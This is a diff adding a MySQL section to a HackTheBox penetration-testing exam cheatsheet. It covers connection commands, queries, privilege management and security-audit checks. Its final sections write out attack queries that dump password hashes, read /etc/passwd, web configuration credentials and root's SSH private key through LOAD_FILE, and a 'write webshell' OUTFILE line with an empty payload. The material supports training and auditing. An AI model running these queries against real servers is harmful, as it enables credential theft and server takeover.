@@ -24,6 +24,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [IMAP POP3](#imap-pop3)
     - [SNMP](#snmp)
     - [MSSQL](#mssql)
+    - [MySQL](#MySQL)
     - [IPMI](#ipmi)
     - [Linux Remote Management SSH](#linux-remote-management-ssh)
     - [Windows Remote Management SSH](#linux-remote-management-ssh)
@@ -441,6 +442,376 @@ snmpwalk -c public -v1 <target-ip>
 ```
 impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
 impacket-mssqlclient 'nagoya-industries.com/svc_mssql:Service1@240.0.0.1' -windows-auth
+```
+##### MySQL
+```
+==========================================================================================
+CONNECTION
+==========================================================================================
+****************************************
+## Unix Socket (localhost → socket file)
+****************************************
+# Connect via Unix socket, using current Linux user
+mysql
+
+# Connect as root via socket (needs sudo)
+sudo mysql
+
+# Connect to a specific user via socket
+mysql -u usertest
+
+****************************************
+## TCP/IP Local (127.0.0.1)
+****************************************
+# Connect via TCP, password required
+mysql -h 127.0.0.1 -u usertest2 -p
+
+# Connect via TCP, password required , specific port
+mysql -h 127.0.0.1 -P 3306 -u usertest2 -p
+
+****************************************
+## Remote (% - any IP)
+****************************************
+# Remote connection to MySQL server
+mysql -h <SERVER_IP> -u usertest3 -p
+
+# Remotely connect to a specific database
+mysql -h <SERVER_IP> -u usertest3 -p mydb
+
+****************************************
+## Remote (subnet - 192.168.1.x/24)
+****************************************
+# Connect from a machine within the local network range
+mysql -h 192.168.1.100 -u usertest3 -p
+
+# Connect to specific port + db
+mysql -h 192.168.1.100 -P 3306 -u usertest3 -p mydb
+
+****************************************
+## Remote (subnet - 192.168.1.x/24)
+****************************************
+# Run the query directly without entering the shell
+mysql -u root -p -e "SHOW DATABASES;"
+
+# Connect and run the .sql file
+mysql -u root -p mydb < backup.sql
+
+****************************************
+## PowerShell
+****************************************
+# Connect and run query
+& "C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe" -u root -p -e "SHOW DATABASES;"
+
+==========================================================================================
+QUERY INFO
+==========================================================================================
+****************************************
+## DATABASE
+****************************************
+# List all databases
+SHOW DATABASES;
+
+# Select the database to use
+USE mydb;
+
+****************************************
+## TABLE
+****************************************
+# List all tables in the current database
+SHOW TABLES;
+
+# List tables of other db
+SHOW TABLES FROM mydb;
+
+****************************************
+## SELECT / QUERY
+****************************************
+# Get all data
+SELECT * FROM users;
+
+# Get specific columns
+SELECT id, username, email FROM users;
+
+# Filter conditions
+SELECT * FROM users WHERE id = 1;
+SELECT * FROM users WHERE username = 'admin';
+
+# Approximate search
+SELECT * FROM users WHERE username LIKE '%admin%';
+
+# Multiple conditions
+SELECT * FROM users WHERE id > 10 AND email IS NOT NULL;
+
+# Arrange
+SELECT * FROM users ORDER BY created_at DESC;
+
+# Limit number of lines
+SELECT * FROM users LIMIT 10;
+SELECT * FROM users LIMIT 10 OFFSET 20;
+
+# Count the number of lines
+SELECT COUNT(*) FROM users;
+
+# Group by
+SELECT role, COUNT(*) as total FROM users GROUP BY role;
+
+# Join 2 tables
+SELECT u.username, o.order_id
+FROM users u
+JOIN orders o ON u.id = o.user_id;
+
+# Find null values
+SELECT * FROM users WHERE email IS NULL;
+SELECT * FROM users WHERE email IS NOT NULL;
+
+==========================================================================================
+USER MANAGEMENT
+==========================================================================================
+# See all users
+SELECT user, host FROM mysql.user;
+
+# View the currently logged in user
+SELECT USER();
+SELECT CURRENT_USER();
+
+==========================================================================================
+SHOW RIGHTS (PRIVILEGES)
+==========================================================================================
+# View the current user's permissions
+SHOW GRANTS;
+
+# View permissions of specific users
+SHOW GRANTS FOR 'usertest'@'localhost';
+
+# View user permissions on all hosts
+SHOW GRANTS FOR 'usertest'@'%';
+
+# View permission details in the system table
+SELECT * FROM information_schema.USER_PRIVILEGES
+WHERE GRANTEE = "'usertest'@'localhost'";
+
+# View permissions for each table
+SELECT * FROM information_schema.TABLE_PRIVILEGES
+WHERE GRANTEE = "'usertest'@'localhost'";
+
+# View permissions by each column
+SELECT * FROM information_schema.COLUMN_PRIVILEGES
+WHERE GRANTEE = "'usertest'@'localhost'";
+
+# View all permissions of every user
+SELECT * FROM mysql.user\G
+
+==========================================================================================
+GRANT/REVOKE RIGHTS
+==========================================================================================
+# Grant all permissions on a database
+GRANT ALL PRIVILEGES ON mydb.* TO 'usertest'@'localhost';
+
+# Grant SELECT and INSERT permissions on a database
+GRANT SELECT, INSERT ON mydb.* TO 'usertest'@'localhost';
+
+# Grant permissions to only one table
+GRANT SELECT ON mydb.users TO 'usertest'@'localhost';
+
+# Grant permissions and allow this user to grant to others
+GRANT ALL PRIVILEGES ON mydb.* TO 'usertest'@'localhost' WITH GRANT OPTION;
+
+# Grant SUPER permission (admin level)
+GRANT SUPER ON *.* TO 'usertest'@'localhost';
+
+# Authorize all databases (DBA)
+GRANT ALL PRIVILEGES ON *.* TO 'usertest'@'localhost';
+
+# Revoke permissions
+REVOKE INSERT ON mydb.* FROM 'usertest'@'localhost';
+
+# Revoke all permissions
+REVOKE ALL PRIVILEGES ON mydb.* FROM 'usertest'@'localhost';
+
+# Apply permission changes immediately
+FLUSH PRIVILEGES;
+
+==========================================================================================
+FILE PRIVILEGES
+==========================================================================================
+# Grant permissions to read/write files (need SUPER)
+GRANT FILE ON *.* TO 'usertest'@'localhost';
+
+# Check if the user has FILE permission
+SELECT user, host, File_priv FROM mysql.user WHERE user = 'usertest';
+
+# Read file from MySQL (needs FILE privilege)
+SELECT LOAD_FILE('/etc/passwd');
+
+# Write results to file
+SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
+FIELDS TERMINATED BY ','
+LINES TERMINATED BY '\n';
+
+# View directories that are allowed to write files
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+# Load files into the table
+LOAD DATA INFILE '/tmp/users.csv' INTO TABLE users
+FIELDS TERMINATED BY ','
+LINES TERMINATED BY '\n';
+
+==========================================================================================
+SECURITY CHECKLIST
+==========================================================================================
+# See which users have empty passwords
+SELECT user, host FROM mysql.user WHERE authentication_string = '';
+
+# See which users have FILE permissions
+SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
+
+# See which users have SUPER permissions
+SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
+
+# See which users have permissions on all databases
+SELECT user, host FROM mysql.user WHERE Select_priv = 'Y';
+
+# See secure_file_priv (secure directory for FILE)
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+==========================================================================================
+INFORMATION_SCHEMA
+==========================================================================================
+# See all databases
+SELECT schema_name FROM information_schema.schemata;
+
+# View all tables
+SELECT table_schema, table_name, table_rows
+FROM information_schema.tables
+WHERE table_schema NOT IN ('information_schema','mysql','performance_schema');
+
+# View all columns of a table
+SELECT column_name, data_type, is_nullable
+FROM information_schema.columns
+WHERE table_schema = 'mydb' AND table_name = 'users';
+
+# Find a table containing a column with a specific name
+SELECT table_schema, table_name
+FROM information_schema.columns
+WHERE column_name = 'email';
+
+==========================================================================================
+QUICK REFERENCE
+==========================================================================================
+# See MySQL version
+SELECT VERSION();
+
+# View server time
+SELECT NOW();
+
+# See uptime
+SHOW STATUS LIKE 'Uptime';
+
+# Exit MySQL shell
+EXIT;
+QUIT;
+\q
+
+==========================================================================================
+SERVER INFO (@@variables)
+==========================================================================================
+# See the hostname of the MySQL server
+SELECT @@hostname;
+
+# View data storage folder (database files)
+SELECT @@datadir;
+
+# View MySQL installation directory
+SELECT @@basedir;
+
+# See the currently connected user (may be different from current_user if using DEFINER)
+SELECT user();
+
+# See what user is actually using (after applying privilege)
+SELECT current_user();
+
+# See the port MySQL is listening on
+SELECT @@port;
+
+# See socket file path
+SELECT @@socket;
+
+==========================================================================================
+DANGEROUS CONFIGURATION (Pentest / Audit)
+==========================================================================================
+# Directory allowed to read/write files (empty = unlimited → dangerous)
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+# Allow clients to read local files (ON = dangerous)
+SHOW VARIABLES LIKE 'local_infile';
+
+# Which IP MySQL is listening on (0.0.0.0 = fully open → dangerous)
+SHOW VARIABLES LIKE 'bind_address';
+
+# See if the general log is turned on (on = logs all queries → reveals information)
+SHOW VARIABLES LIKE 'general_log';
+
+# View all security related configurations at once
+SHOW VARIABLES LIKE 'secure_file_priv';
+SHOW VARIABLES LIKE 'local_infile';
+SHOW VARIABLES LIKE 'general_log';
+SHOW VARIABLES LIKE 'bind_address';
+
+==========================================================================================
+COLLECT USER INFORMATION (Pentest / Audit)
+==========================================================================================
+# View full user information: name, host, authentication plugin, password hash
+SELECT user, host, plugin, authentication_string FROM mysql.user;
+
+# List databases via information_schema (alternatively SHOW DATABASES)
+SELECT schema_name FROM information_schema.schemata;
+
+# List tables via information_schema (alternatively SHOW TABLES)
+SHOW TABLES;
+
+DESC users;
+
+# Query the entire contents of a table
+SELECT * FROM users;
+
+==========================================================================================
+DANGEROUS USER (Pentest / Audit)
+==========================================================================================
+# Anonymous user - no username required for login
+SELECT user, host FROM mysql.user WHERE user = '';
+
+# User allowed to connect from anywhere (% = any IP)
+SELECT user, host FROM mysql.user WHERE host = '%';
+
+# User has SUPER privileges (equivalent to admin)
+SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
+
+# User has FILE privileges (read/write system files)
+SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
+
+# User has no password (authentication_string is empty)
+SELECT user, host FROM mysql.user
+WHERE authentication_string = '';
+
+==========================================================================================
+READ SYSTEM FILES VIA MYSQL (privilege file required)
+==========================================================================================
+# Read /etc/passwd (Linux user accounts)
+SELECT LOAD_FILE('/etc/passwd');
+
+# Read web app configuration file (usually contains DB credentials)
+SELECT LOAD_FILE('/var/www/html/config.php');
+
+# Read MySQL configuration file
+SELECT LOAD_FILE('/etc/mysql/mysql.conf.d/mysqld.cnf');
+
+# Read SSH private key (if MySQL is running with elevated privileges)
+SELECT LOAD_FILE('/root/.ssh/id_rsa');
+
+# Write webshell to web server (requires an empty secure_file_priv)
+SELECT '' INTO OUTFILE '/var/www/html/shell.php';
+
+
 ```
 ##### IPMI
 ```
